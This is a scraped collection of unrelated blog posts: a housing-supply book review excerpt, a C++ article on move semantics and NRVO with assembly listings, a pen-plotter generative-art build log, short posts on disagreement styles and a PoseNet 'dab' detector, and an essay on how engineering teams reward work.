timing—which isn’t to knock them: I’d love to have lucky timing too. As of July 23 2020, it appears that <a href="https://www.sfchronicle.com/business/article/Google-commits-over-100-million-of-1-billion-15428754.php">Google has promised to invest more money in Factory_OS</a>, so the company is still presumably alive. But it has an ominously small number of mentions in the media over the last year.</p>
<p><strong>One major thing might</strong> break the zoning logjam: by now, intellectuals and investors know the single-family zoning racket and know that single-family zoning is designed to enrich property owners. It’s not hard to figure out how to profit from above-market returns, as Invitation Homes has: buy the asset. But as investment funds buy single-family properties, the composition of renters versus owners will change, and more renters will be part of the voting pool. If renters can figure out how supply and demand work—a big “if,” given anti-market bias—they’ll vote to expand the supply of housing. So far, we’ve not seen much of this dynamic, but, as the costs of housing continue to increase, we might see more of it as people go looking for answers. Voters can ineffectively blame landlords and “greedy” developers, or they can effectively look for solutions. <em>Golden Gates</em> is part of the solutions firmament, if enough people read it and change their behavior based on new knowledge. That’s a big “if,” however.</p>
<p>To me, it remains strange and interesting that many people who are superficially interested in lowering housing costs won’t believe that the obvious solution, known for centuries—since the time of Adam Smith—to high prices is greater supply. Any solution that is not “more supply” will entail shortages. We can’t legislate away supply and demand. Yet a common urban trope involves blaming the people attempting to respond to price signals with more product for being “greedy.” The ineffectiveness of this response is obvious, but until recently there’s been no organized political response to the problem. Dougherty is chronicling that response—and telling the stories of the people responding.</p>

  <div itemprop="articleBody">
    <p>Compilers are getting better with each release. Sometimes a noticeable difference can be observed in the assembly output for the same piece code in a different version of the same compiler (can be easily done via <a href="https://godbolt.org/">compiler explore</a>).</p>

<p>I have gotten into the practice of checking the assembly output lately to analyze the overhead of various implementations. Beware, sometimes it can get addictive. But I think it is a nice way of learning to read assembly and also be amazed at how clever the compilers are these days.</p>

<p>In this article, I am going to cover one such incident that happened when I was looking at the assembly output of a function during my <a href="https://github.com/Panky-codes/CHIP8">CHIP8</a> implementation.</p>

<p>But the context of the problem first!</p>

<h2 id="the-magic-of-move-semantics">The magic of move semantics</h2>
<p>Move semantics was introduced in C++11. We can think of move semantics as a way of transferring ownership of an object. If you are really new to move semantics, consider the following example:</p>

<p>So your colleague has a document that you also want. We have two options here. The first option, you take that document to a copier, take a copy of the document for yourself, and return the original document to your colleague. The second option, assuming your colleague doesn’t need the document anymore, instead of throwing it away, your colleague can give it to you, thereby, saving paper.</p>

<p>Replace the document with a memory resource in a program, then the first option is doing a copy, and the second option is doing a move, where you transfer the ownership instead of wasting the resource.</p>
<h2 id="putting-what-i-learned-in-action">Putting what I learned in action</h2>
<p>While implementing my <a href="https://github.com/Panky-codes/CHIP8">CHIP8</a> emulator, I saw an opportunity to replace an expensive copy operation into a cheap move operation (at least that is what I thought).</p>

<p>To give a bit of context: In each frame cycle, I had to return an array containing 2048 integers that will be used to draw the graphics on the screen. The pseudo-C++ code is shown below:</p>

<div><div><pre><code><span>// chip8.cpp</span>
<span>static</span> <span>constexpr</span> <span>display_size</span> <span>=</span> <span>2048</span><span>;</span>
<span>class</span> <span>Chip8</span> <span>{</span>
    <span>...</span> 
    <span>public</span> <span>:</span> 
        <span>std</span><span>::</span><span>array</span><span>&lt;</span><span>uint8_t</span><span>,</span> <span>display_size</span><span>&gt;</span> <span>get_display_pixels</span><span>()</span> <span>{</span>
              <span>// Do some computation</span>
              <span>return</span> <span>gfx</span><span>;</span>
          <span>}</span>
    <span>...</span> 
    <span>private</span> <span>:</span> 
        <span>std</span><span>::</span><span>array</span><span>&lt;</span><span>uint8_t</span><span>,</span> <span>display_size</span><span>&gt;</span> <span>gfx</span><span>{};</span>
<span>};</span>

<span>// main.cpp</span>
<span>while</span> <span>(</span><span>displayOn</span><span>)</span> <span>{</span>
    <span>...</span> 
    <span>const</span> <span>auto</span> <span>disp_pixels</span> <span>=</span> <span>emulator</span><span>.</span><span>get_display_pixels</span><span>();</span>
    <span>...</span>
    <span>// Use disp_pixels to draw pixels on the screen</span>
<span>}</span>
</code></pre></div></div>

<p>This is what I assumed was going on when I did the call to <code>get_display_pixels()</code> member function:</p>
<ol>
  <li>The compiler <code>copies</code> the <code>gfx</code> private variable of the <code>Chip8</code> class to the return value of the <code>get_display_pixels()</code> member function.</li>
  <li>The compiler calls the <code>copy constructor</code> to copy the return value of the function call to the <code>disp_pixels</code> variable.</li>
</ol>

<p>So, I concluded that I could use a <code>move constructor</code> to transfer the contents to my local variable <code>disp_pixels</code> to avoid a copy in the second step as described above.</p>

<p>So I changed my code in the <code>main</code> function as follows:</p>
<div><div><pre><code><span>// main.cpp</span>
<span>while</span> <span>(</span><span>displayOn</span><span>)</span> <span>{</span>
    <span>...</span> 
    <span>const</span> <span>auto</span> <span>disp_pixels</span> <span>=</span> <span>std</span><span>::</span><span>move</span><span>(</span><span>emulator</span><span>.</span><span>get_display_pixels</span><span>());</span>
    <span>...</span>
    <span>// Use disp_pixels to draw pixels on the screen</span>
<span>}</span>
</code></pre></div></div>

<p>Before you get furious and stop reading the article further because what I assumed was completely wrong, I realized that too, and the rest of the article is about that.</p>

<p>As soon as I used a <code>std::move</code> as shown in my previous code snippet, I observed the compiler was generating more assembly code than my initial code without a <code>std::move</code>(with std::move: <a href="https://godbolt.org/z/WulpDX">link</a>, without std::move: <a href="https://godbolt.org/z/oU8Tq4">link</a>).</p>

<p>What went wrong? Hmm….</p>
<h2 id="nrvo-to-the-rescue">NRVO to the rescue</h2>
<p>NRVO stands for Named Return Value Optimization. It is a nice trick that the compiler uses to omit unnecessary copy or move if certain conditions are met. Compilers have been using this trick for a long time. If <code>NRVO</code> takes place in our function call, then effectively we just do one copy instead of two. Let’s see how it works.</p>

<p>Even though the function signature of <code>get_display_pixels</code> indicates that it does not take any parameters, the compiler will pass one extra parameter behind the scenes from the caller (initialization call of <code>disp_pixels</code> from <code>main.cpp</code>) to the callee (<code>get_display_pixels</code> function in <code>chip8.cpp</code>). The caller will allocate the memory for the return value and pass the address of that memory to the callee. The callee will use that memory to construct the object and copy the value of the private variable <code>gfx</code> (in this case). As the memory of the caller (<code>disp_pixels</code>) was used by the callee, there is no need to copy the return value again, thereby, saving one unnecessary copy/move operation.</p>

<p>We should see the assembly output to really understand how <code>NRVO</code> is happening under the hood. The assembly code from the caller side is as follows:</p>
<div><div><pre><code><span>1</span>   <span>lea</span>  <span>rax</span><span>,</span> <span>[</span><span>rbp</span><span>-</span><span>16384</span><span>]</span>
<span>2</span>   <span>lea</span>  <span>rdx</span><span>,</span> <span>[</span><span>rbp</span><span>-</span><span>8192</span><span>]</span>
<span>3</span>   <span>mov</span>  <span>rsi</span><span>,</span> <span>rdx</span>
<span>4</span>   <span>mov</span>  <span>rdi</span><span>,</span> <span>rax</span>
<span>5</span>   <span>call</span> <span>Chip8</span><span>::</span><span>get_display_pixels</span><span>()</span>
</code></pre></div></div>
<p>Before the function call, <code>rsi</code> and <code>rdi</code> registers are loaded with upper and lower bound of the memory address of the <code>disp_pixels</code> variable. And, the trimmed assembly output from the callee side is as follows:</p>

<div><div><pre><code><span>1</span>   <span>Chip8</span><span>::</span><span>get_display_pixels</span><span>()</span><span>:</span>
<span>2</span>   <span>push</span> <span>rbp</span>
<span>3</span>   <span>mov</span>  <span>rbp</span><span>,</span> <span>rsp</span>
<span>4</span>   <span>mov</span>  <span>QWORD</span> <span>PTR</span> <span>[</span><span>rbp</span><span>-</span><span>8</span><span>],</span> <span>rdi</span>
<span>5</span>   <span>mov</span>  <span>QWORD</span> <span>PTR</span> <span>[</span><span>rbp</span><span>-</span><span>16</span><span>],</span> <span>rsi</span>
<span>...</span>
</code></pre></div></div>
<p>As seen from the callee side, the <code>rdi</code> and <code>rsi</code> values are moved to the stack, and further operations are performed with that memory address. Pretty neat!</p>

<p>A <code>simple analogy</code> for <code>NRVO</code> I like to think of is when you are asking a friend to fill in water inside a water bottle, you would give your bottle to fill water from the tap directly. It would be inefficient to first fill the water in a temporary bottle and transfer the contents again to your bottle. In the C++ context, <code>bottle</code> is the <code>memory space</code> and the <code>water</code> it holds is the <code>return value</code>.</p>

<p>If we assume that the  <code>NRVO</code> will take place, then the most efficient way of writing my function call is:</p>
<div><div><pre><code><span>// main.cpp</span>
<span>while</span> <span>(</span><span>displayOn</span><span>)</span> <span>{</span>
    <span>...</span> 
    <span>const</span> <span>auto</span> <span>disp_pixels</span> <span>=</span> <span>emulator</span><span>.</span><span>get_display_pixels</span><span>();</span>
    <span>...</span>
    <span>// Use disp_pixels to draw pixels on the screen</span>
<span>}</span>
</code></pre></div></div>
<p>GCC and Clang even have an extra warning flag <code>-Wpessimizing-move</code> which detects when we are trying to use a <code>move</code> where compiler-generated NRVO is much more efficient.</p>

<p>Even though we can assume in many situations that a <code>NRVO</code> will take place, especially if optimizations are turned on, C++ standard does not guarantee <code>NRVO</code> in all situations<sup>1</sup>. But what if compiler does not perform a <code>NRVO</code>?</p>
<h2 id="lvalues-and-rvalues-and-all-other-value-categories-in-between">Lvalues and Rvalues (and all other value categories in between)</h2>
<p>Even though there are some <a href="http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2020/p2025r0.html">proposals</a> to guarantee <code>NRVO</code>, it is not yet guaranteed by the standard. As it is not guaranteed, should we explicitly indicate a move operation to save a copy just in case the compiler doesn’t do a <code>NRVO</code>? To answer that, I added the flag <code>-fno-elide-constructors</code> that disables copy elision (the super-set of NRVO) in our code, thereby, allowing to see what the compiler does otherwise.</p>

<p>I was surprised to see that compiler was still performing a <code>NRVO</code> for <code>C++17</code> standard with <code>-fno-elide-constructors</code> enabled. But this was not the case for <code>C++14</code>, the compiler generated different assembly with <code>-fno-elide-constructors</code> enabled. If someone knows the reason why this difference occurs between <code>C++17</code> and <code>C++14</code> even though <code>NRVO</code> is not guaranteed, please email me about it. Godbolt <a href="https://godbolt.org/z/hPW3rh">link</a>.</p>

<p>Let’s use <code>C++14</code> with <code>-fno-elide-constructors</code> flag to simulate the scenario where the compiler fails to apply <code>NRVO</code> so that we can check whether we needed to do something extra to avoid superfluous copies.</p>

<p>So I added <code>-fno-elide-constructors</code> to disable any <code>NRVO</code> to the final code of the previous section. The caller generated the following assembly code:</p>

<div><div><pre><code><span>1</span>   <span>lea</span>  <span>rdx</span><span>,</span> <span>[</span><span>rbp</span><span>-</span><span>8192</span><span>]</span>
<span>2</span>   <span>lea</span>  <span>rax</span><span>,</span> <span>[</span><span>rbp</span><span>-</span><span>16384</span><span>]</span>
<span>3</span>   <span>mov</span>  <span>rsi</span><span>,</span> <span>rdx</span>
<span>4</span>   <span>mov</span>  <span>rdi</span><span>,</span> <span>rax</span>
<span>5</span>   <span>call</span> <span>Chip8</span><span>::</span><span>get_display</span><span>()</span>
<span>6</span>   <span>lea</span>  <span>rdx</span><span>,</span> <span>[</span><span>rbp</span><span>-</span><span>8192</span><span>]</span>
<span>7</span>   <span>lea</span>  <span>rax</span><span>,</span> <span>[</span><span>rbp</span><span>-</span><span>16384</span><span>]</span>
<span>8</span>   <span>mov</span>  <span>rsi</span><span>,</span> <span>rdx</span>
<span>9</span>   <span>mov</span>  <span>rdi</span><span>,</span> <span>rax</span>
<span>10</span>  <span>call</span> <span>std</span><span>::</span><span>array</span><span>&lt;</span><span>unsigned</span> <span>char</span><span>,</span> <span>32ul</span><span>&gt;::</span><span>array</span><span>(</span><span>std</span><span>::</span><span>array</span><span>&lt;</span><span>unsigned</span> <span>char</span><span>,</span> <span>32ul</span><span>&gt;&amp;&amp;</span><span>)</span>
</code></pre></div></div>

<p>As we can notice, the first 5 assembly instructions are the same as the version with NRVO enabled, and there are 5 more assembly instructions in this version as we disabled NRVO. The most important instruction we need to focus on is line number 10 where a <code>move constructor</code>(notice <code>&amp;&amp;</code> in the function signature). Wait, a <code>move constructor</code> is invoked? I did not use a <code>std::move</code> but the compiler decided to do it anyway. To really comprehend the reason, we need to understand <code>value categories</code> in C++.</p>

<p>In these two articles: <a href="https://eli.thegreenplace.net/2011/12/15/understanding-lvalues-and-rvalues-in-c-and-c">Understanding lvalues and rvalues in C and C++ </a> and <a href="http://eel.is/c++draft/basic.lval#1">basic.lval#1</a>, value categories are explained in detail<sup>2</sup>. In brief, quoting from the first article: “An lvalue (locator value) represents an object that occupies some identifiable location in memory. Rvalue is an expression that does not represent an object occupying some identifiable location in memory.”. Of course, there are more categories than just a <code>lvalue</code> and a <code>rvalue</code>. I would highly recommend reading both articles. Though you don’t need a perfect grasp of them to understand what comes later in this article. Let’s get back to our original example and analyze why the move constructor was called.</p>

<div><div><pre><code><span>// main.cpp</span>
<span>while</span> <span>(</span><span>displayOn</span><span>)</span> <span>{</span>
    <span>...</span> 
    <span>const</span> <span>auto</span> <span>disp_pixels</span> <span>=</span> <span>emulator</span><span>.</span><span>get_display_pixels</span><span>();</span>
    <span>...</span>
    <span>// Use disp_pixels to draw pixels on the screen</span>
<span>}</span>
</code></pre></div></div>
<p>In the above code snippet, the function call to <code>get_display_pixels</code> belongs to the <code>rvalue</code> (more precisely a <code>prvalue</code>) category and it generates a temporary. The compiler can now safely <code>move</code> that temporary into the <code>disp_pixels</code> variable because that temporary will be destroyed anyway after this statement. If the type that is being returned does not have a move constructor (in our case <code>std::array</code> has a move constructor), then the compiler will call the <code>copy constructor</code>.</p>

<p>In principle, if any of the <code>moveable</code> types (standard or user-defined) is returned from a function by <code>value</code>, we can safely assume either <code>NRVO</code> or <code>move operation</code> will take place resulting in no superfluous copies for standard compilers that support <code>C++11</code> and above.</p></div></article></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/p2mess_zoom_hu8e325a65af689050d72be44b66a03b9f_716964_636x0_resize_q75_box.jpg" alt="Penrose P2 mess" data-zoom-src="/posts/pen-plotter/images/p2mess_zoom.jpg" data-zoomable=""><figcaption>Penrose P2 mess</figcaption></figure><p>For the last ~2 years, I’ve been making generative art. So far, it’s been bad for my health, wallet, sanity and general focus. I enjoy creating complex, emergent, generative content that makes your eyeballs perplexed and lost for a while until you figure out simple rules that are used to make it.</p><p>It all started when I was looking for a new toy project to write in the Rust programming language (which, itself, is super neat. Fighting with the borrow checker is 10/10 experience). I decided to make it draw pretty, silly things. Initially, I played with particles being affected by fields, which resulted in stuff like this:</p><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/star1_hu48a0a69b33a045876d91b7df7bdcad4f_1955328_636x0_resize_q75_box.jpg" alt="Particles trails, a lot of particles" data-zoom-src="/posts/pen-plotter/images/star1.jpg" data-zoomable=""><figcaption>Particles trails, a lot of particles</figcaption></figure><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/mantis_hudef7f76de08ea44bcc0eee363c479bae_2166917_636x0_resize_q75_box.jpg" alt="Particles trails, wobbling up and down" data-zoom-src="/posts/pen-plotter/images/mantis.jpg" data-zoomable=""><figcaption>Particles trails, wobbling up and down</figcaption></figure><p>Then, predictably, I got bored. Some time afterwards, I randomly found the art of <a href="http://robertfathauer.com/">Robert Fathauer</a> and I was mesmerized. <a href="http://robertfathauer.com/6FoldFTiling.html">6Fold Tiling</a> is a print made with a laser-cut woodblock. I had an access to a laser cutter at my work. I found <a href="http://www.fractalcurves.com/">Fractal Curves</a>, which is a great resource if you’re looking for funky, self-similar, fractal shapes. I played with <a href="http://www.fractalcurves.com/Root3.html">Terdragon</a> curve a bit. It’s a magnificent beast, can be tiled, it’s self avoiding, and the legend says it was found by Donald Knuth. I came up with some neat tesselations, burned two design plywood sheets with differing iteration steps. The results were quite pleasing. I did not stop there, and made a few other designs.</p><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/terdragons_hu27f7dc34c9db8fd2b063f3fba6be9864_314128_636x0_resize_q75_box.jpg" alt="Printing with laser-etched plywood" data-zoom-src="/posts/pen-plotter/images/terdragons.jpg" data-zoomable=""><figcaption>Printing with laser-etched plywood</figcaption></figure><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/IMG_20190227_192650_hub9bcfbd7fbe079a33acfd2e29bcc3094_526602_636x0_resize_q75_box.jpg" alt="L-system based design made with woodblock printing" data-zoom-src="/posts/pen-plotter/images/IMG_20190227_192650.jpg" data-zoomable=""><figcaption>L-system based design made with woodblock printing</figcaption></figure><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/MVIMG_20190227_194557_hu6c91ec9686bdb0086c368885c2bfcfd0_490600_636x0_resize_q75_box.jpg" alt="Another L-system, a &quot;recurrent mean frog&quot;" data-zoom-src="/posts/pen-plotter/images/MVIMG_20190227_194557.jpg" data-zoomable=""><figcaption>Another L-system, a "recurrent mean frog"</figcaption></figure><p>Sadly, laser-cut woodblock printing is very laborious and requires access to a beefy laser cutter. It’s fun from time to time, but I can’t see me doing it as a hobby. But, pen plotters! They have an active and healthy community of artists and hackers doing marvellous <a href="https://twitter.com/hashtag/plottertwitter">things</a> with them. They are usually built with mechanicals lifted from recent 3d printers. Steppers, Arduino, v-slots, etc. I got myself an EleksMaker EleksDraw pen plotter.</p><p>And I was very happy with it. It’s mesmerizing to watch. I used it mostly to generate some squiggles based on Penrose P2 tiling, some 3d renders using Michael Fogleman excellent <a href="https://github.com/fogleman/ln">ln art engine</a>, and some spirals.</p><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/IMG_20191113_200736_hu60a10dbc35e8b7122d3fdacc3a0ec497_1353701_636x0_resize_q75_box.jpg" alt="&quot;Squeres on Cubes&quot;" data-zoom-src="/posts/pen-plotter/images/IMG_20191113_200736.jpg" data-zoomable=""><figcaption>"Squeres on Cubes"</figcaption></figure><p>But I had this urge to go larger with my work. Obviously, larger == better :). I upgraded the long axis of EleksDraw with longer rails, but it made it very difficult to use. I blame gravity and my lack of understanding of physics. When extended to the furthest position, the penholder was sagging too low. When near, it was too high. Pen drops from large height are very unkind toa pen tip. I had to write down a special, slow pen up/down sequence that was making the plotting process painfully slow. Because of that, I started making a lot of single-line plots.</p><p>Recently I acquired a shed in my garden, It was an ideal excuse to go wild with my pen plotter obsession.</p><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/PXL_20200710_120008520_hu618f6de8682f0d9213d6858de3a74c01_525666_636x0_resize_q75_box.jpg" alt="The Shed. Yellow skinned, weirdly haired presence in my garden" data-zoom-src="/posts/pen-plotter/images/PXL_20200710_120008520.jpg" data-zoomable=""><figcaption>The Shed. Yellow skinned, weirdly haired presence in my garden</figcaption></figure><p>I decided to build a plotter using <a href="https://openbuilds.com/builds/openbuilds-acro-system.5416/">OpenBuilds Acro</a> 150x100 frame. I ordered one from <a href="https://ratrig.com/">RatRig</a>, and most of the electronics from <a href="https://ooznest.co.uk/">ooznest</a> (extremely reliable company, fast shipping times, but that’s probably because they are located fairly close :D). I cut down an MDF board to size, assembled the whole thing, connected motors to GRBL Arduino shield.</p><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/PXL_20200710_115940029_hu7fa27841d7f828a81e5890bf4d723758_978081_636x0_resize_q75_box.jpg" alt="The Plotter.

Because of it's size, and terrible cabling, it has been nicknamed 'Your mom'</figcaption></figure><p>Then I got some hard lessons on how steppers work. They do vibrate, that’s what they do. I spend multiple days trying to figure out if the problem is exacerbated by the frame, loose belts, steppers, wiring or electronics.</p><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/PXL_20200704_183342254_hucd8e8854f91f1da0f86932b0da09896d_84429_636x0_resize_q75_box.jpg" alt="Y axis wobbling.

At low speeds, steepers were vibrating like excited toddlers</figcaption></figure><p>After a painful and long inspection, I found a culprit, it was <a href="https://ooznest.co.uk/product/drv8825-stepper-motor-driver/">DRV8825</a> stepper drivers. I got them because of their 1/32 microstepping and high current output. Apparently, using them is a bit like a lottery, either they work with your steppers without a problem, or they are a pain in the ass.</p><p>I had more luck with <a href="https://ooznest.co.uk/product/a4988-stepper-motor-driver">A4988</a> steppers, they were more reliable, and the wibbling decreased. But was still present, unless I limited the current to silly levels.</p><p>Then I got <a href="https://shop.watterott.com/SilentStepStick-TMC2209-Stepper-Motor-Driver">TMC2809</a> based drivers from Watterott. They are worth their weight in gold. Really smooth, motors are silent, there’s no wobbling.</p><p>Just in case, and to get better performance with higher speeds, I got myself some <a href="https://www.oriental-motor.co.uk/Products/Stepper_motors/Accessories/Accessories/Dampers/">clean dampers</a>, but they will have to wait for some dual-shaft steppers, so I can mount them easily.</p><p>This is the first A2 work I finished. I’m quite proud.</p><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/PXL_20200712_183148014_hu4e6e62bba50aeabbea985434601a816f_405040_636x0_resize_q75_box.jpg" alt="Human growth #1" data-zoom-src="/posts/pen-plotter/images/PXL_20200712_183148014.jpg" data-zoomable=""><figcaption>Human growth #1</figcaption></figure><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/PXL_20200710_203221728_hudeaf633ca98413b9db1e5465eeaf09e0_436891_636x0_resize_q75_box.jpg" alt="P2 tiling hatching" data-zoom-src="/posts/pen-plotter/images/PXL_20200710_203221728.jpg" data-zoomable=""><figcaption>P2 tiling hatching</figcaption></figure></div></div>]]>

<p>In any disagreement, no matter how respectful it is, each person has 4 options at any given time:</p>



<ol><li>Continue discussing it</li><li>Stop discussing it because the value of convincing the other person isn’t worth the time and effort</li><li>Stop discussing it out of fear of conflict or of the other person liking you less if you keep at it</li><li>Stop discussing it because you accept that you’re wrong</li></ol>



<p>Option 1 people have a higher threshold for when to stop arguing, relative to the people they argue with. Either they’re very persuasive or, more often, they’re good at wearing people down until they give up. They can be difficult, and sometimes downright toxic. I’m sure you can think of some option 1 people you’ve dealt with. </p>



<p>Option 2 people give up because it’s not worth their time. Sometimes option 2 people are just busy or pragmatic, but often I find that option 2 situations say more about the winner than the conceder. If you encounter lots of option 2 people, maybe you have a reputation of being an option 1 person so people have given up on productive discussions with you.</p>



<p>Option 3 people probably don’t like conflict or awkward conversations. I am an option 3 person. I <a href="https://critter.blog/2020/08/13/clear-is-kind-unclear-is-unkind/">wrote about that a bit here</a>. Option 3 people are tough because if they back down, it’s hard to tell they’re actually convinced or just uncomfortable and trying to be polite.</p>



<p>Option 4 people either like to play devil’s advocate and purposely pick the losing side, or hold strong opinions loosely and are willing to be proven wrong. Option 4 people pursue truth and growth over ego and being right. I strive to be an option 4 person. </p>



<p>I think there’s a lot of value in identifying which type you are, and telling your friends/coworkers/partner. So which type are you? Or am I totally off? <a href="https://twitter.com/mcrittenden">Tweet at me</a> and let me know.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong>Disclaimer:</strong> Don’t dab if you have epilepsy.</p>
<h2 id="dab-detector">Dab detector</h2>
<p>This is a simple experiment playing around with <a href="https://ml5js.org/" rel="nofollow noopener noreferrer" target="_blank">ml5.js</a>. It uses the PoseNet model to recognize when you <a href="https://en.wikipedia.org/wiki/Dab_(dance)" rel="nofollow noopener noreferrer" target="_blank">dab</a> and shows you a little surprise when you do.</p>
<p>To use it, make sure you are in a well <span title="💯😂👌💯">lit</span> environment, accept the camera use request, and stand up so that your whole body shows in the image.</p>
<h2 id="how-does-it-work">How does it work?</h2>
<p>It uses PoseNet, a ml5 model for Real-time Human Pose Estimation. With the data provided by the model, it preforms a really simple check to see if the pose should count as a Dab. It works by checking if the right hand is close to the left ear, and the angles of the elbows are above or under a specified threshold. Vice-versa for the left side. This is a very naive approach, and it wasn’t what I originally intended to do, but after implementing this as a prototype, I realized it worked much better than expected. You can see the function used in the code below, called <code>isPoseADab()</code>.</p>
<p>My plan was to train a simple categorization model using ml5, so it’s a bit of a shame that it doesn’t now. I intend to make some other experiment that does use that feature.</p>
<p>The video, skeleton and emojis are drawn using the <a href="https://p5js.org/" rel="nofollow noopener noreferrer" target="_blank">p5.js</a> rendering library, which works really well next to ml5.</p>
<h2 id="why">Why?</h2>
<p>Uuuhhh... Because my sense of humor got stuck a couple years ago and I non-ironically think this is funny. </p>
<p>In all seriousness, because I wanted to try something with pose recognition, and the first pose that came to mind that was interesting was a Dab.</p></div></div>]]>

<p><em>Reward the behavior you seek</em></p>



<p>In the fable “The Golden Axe,” a woodcutter accidentally drops his axe in a river, losing his only means of support. The god Hermes takes pity on him and retrieves a golden axe from the river. The woodcutter replies that it was not his axe, so Hermes returns with a silver axe. Once again, the woodcutter says that axe was not his. The woodcutter only accepts when the god returns with his actual, lowly axe. Hermes, impressed with the woodcutter’s honesty, gives him all three axes.</p>



<p>When the woodcutter’s neighbor hears what had passed and covets the first woodcutter’s new wealth (golden axes apparently being worth quite a lot on the open market), he throws his own axe into the river to try to reap the same rewards. Hermes comes with a golden axe, which the neighbor claims is his. Hermes punishes his dishonesty by depriving him of the golden axe, the silver axe, and his own original axe.</p>



<hr>



<p>Picture an engineering team. One engineer, either by choice or by mediocre management, spends most of their time paying down technical debt, making proactive improvements to tooling and infrastructure, and building out low-friction ways to add monitoring for production applications.</p>



<p>Meanwhile, another engineer on the same team always seems to get the new, shiny projects to work on: the high visibility features, the highly-touted initiative to “increase engineering velocity” by breaking an application monolith into microservices (to be followed in a year by an equally-touted initiative to merge those microservices back into a monolith), or the fancy new customer product.</p>



<p>Both engineers may be equally skilled and work just as hard, but which one do you think will get the lion’s share of recognition? (If you answered, “The one doing critical glue work,” you either work in a singular organization or you’re seriously out of touch with reality.) And what happens when a new engineer joins the team? Someone who is neither a total narcissist who needs constant adoration nor a masochist who likes to suffer? After seeing the pattern of which engineer gets the public accolades, which behavior do you think they will more likely emulate? The one the team treats as most valuable, of course.</p>



<p>I worked at a company where anyone could nominate a co-worker for demonstrating one of the company “values.” Recipients would get recognized at company all-hands meetings. Let’s see if you can spot a problem here.</p>



<p>Customer success nominates an engineer who helped them troubleshoot a customer-facing problem. Hey, that sounds important, right?</p>



<p>Okay, but what if I tell you that that engineer was the one who pushed the code that broke the service in the first place? Um, well, you don’t want to punish engineers for making mistakes, right? Of course not, but do you really want to give them a t-shirt when they do?</p>



<p>What if I tell you that same engineer had ignored warnings in staging that indicated there were likely performance issues? (In the real-life version of this story, when I sent links to monitoring graphs to ask why we were seeing elevated values for Java heap usage, he replied that the QA team was probably running tests. “Did you ask them?” Crickets. Why didn’t I escalate before the deployment? Ask our common manager at the time what <em>my</em> reward tended to be when I tried to push for the product dev teams to take responsibility for their components’ quality and performance before it got pushed to production.)</p>



<p>The customer success team member who nominated him for helping out during the customer-facing issues did not know the issue’s backstory, though. This recognition system, while not intentionally built to reward “bad” behavior, had no guardrails to prevent rewarding counterproductive habits, either.</p>



<p>Meanwhile, another engineer might deliver a feature that sales can’t really hype to customers and marketing can’t really spin. The code goes live and nothing breaks. Crickets. On the one hand, yes, that engineer did their job and did it correctly. However, an engineer doing troubleshooting, whether for an issue they create in the first place or not, is also doing their job. Again, why does one engineer get recognized and the other does not?</p>



<p>“Human nature” and a number of cognitive biases come into play. We become habituated to things that maintain a predictable state or cadence. We only notice when they stop working, even though that long-lived steady state of reliable functionality required consistent effort behind the curtain to maintain. And of course, new features correlate more strongly with money in the psychology of tech companies. While that association holds some truth, specifically a prominently accepted truth, it’s not the <em>only</em> truth. Quality, service availability and reliability, the ability to maintain engineering development velocity, writing internal documentation: the company cannot bill customers directly for these functions, but try running a sustainable, efficient company without at least some of them. (And many, many, many startups do try to do just that.)</p>



<p>Try this: reward the behavior you seek. And the implicit, but often overlooked, corollary: don’t reward behavior that is, or could easily become, detrimental.</p>



<p>A robust system of positive feedback requires another variable: the difference between publicly rewarding someone compared to privately validating their work.</p>

<p>If you want to encourage healthy behaviors, such as writing internal documentation or onboarding new engineers, as a basis for your engineering culture, recognize them in a public forum. Giving only a private thank-you, while better than nothing, can send a subliminal message to the recipient that, yes, they did something beneficial, but it’s not really something to be proud of. And because the acknowledgement is private, no one else gets the message that the team and company deeply value this kind of effort.</p>



<p>However, you still need to be careful here with what you openly reward. If you constantly publicly recognize someone for putting in overtime, for example, you create the expectation, whether you intend to or not, that to get recognized, an engineer has to work much longer hours. Maybe you and your company want and expect that, but don’t come crying to me when your Glassdoor reviews all talk about burnout from being expected to work long hours. If you do genuinely want to create a culture and company with sustainable work practices, call out quality over quantity, value over volume, practical over pretty. </p>



<p>On another side of encouraging healthy efforts, all engineering teams face some amount of work which, while it must get done, should not be presented or encouraged as “normal,” let alone ideal. “Unplanned” work comprises most, if not all, of this category in most organizations, usually in the form of troubleshooting outages or of other “waterfall” tasks that, for one reason or another, were not the result of otherwise standard proactive planning and prioritization, even in a team that claims to follow Agile methodologies.</p>



<p>For any given instance of these suboptimal tasks, obviously the people who worked on them need to be acknowledged. However, they should be thanked privately, to avoid the normalization of disruptive work within the rest of the team and the company as a whole.</p>



<p>Truly healthy organizations will go beyond thanking the individuals left to work on waterfall tasks. Teams genuinely focused on improvement should respond by making real effort to change or prevent whatever cultural or less-than-ideal management or cross-team dynamics ultimately create these “surprise” (which should really surprise no one who pays attention) situations. Working to minimize or eradicate disruptive work not only increases team efficiency and health over time, it represents a much more genuine acknowledgement of engineers and the value of their time and effort than a thank-you note or yet another company t-shirt can.</p>



<p>You also want to avoid creating a culture of “heroes.” Start by minimizing the occurrence of catastrophic events wherein someone needs to save the day. However, even major projects can create breeding grounds for hero worship. Make sure any forms of public recognition note the wider team context of these efforts. Nothing ever gets done in a true vacuum. Even if one engineer did most of the work for a given project, presumably other team members were taking up the slack as their peer’s time was allocated elsewhere. Also remember and remind your team that not all projects are going to be high-profile “game changers,” but someone will still need to do the work. You don’t want to make people who work on smaller, but still vital, projects to feel less important, and you don’t want to encourage the creation of marquee, but ultimately less valuable, work because you’ve sent the message that those projects and the people who work on them are more important.</p>



<p>Unfortunately, this culture of rewarding people who “create” new shinies, even though maintaining old rusties was more critical and valuable to the company, exists all over. And I have countless examples for my time at Yahoo! alone at how it tends to be both a symptom and an accelerator of an unhealthy, moribund, and highly-politicized company culture.</p>



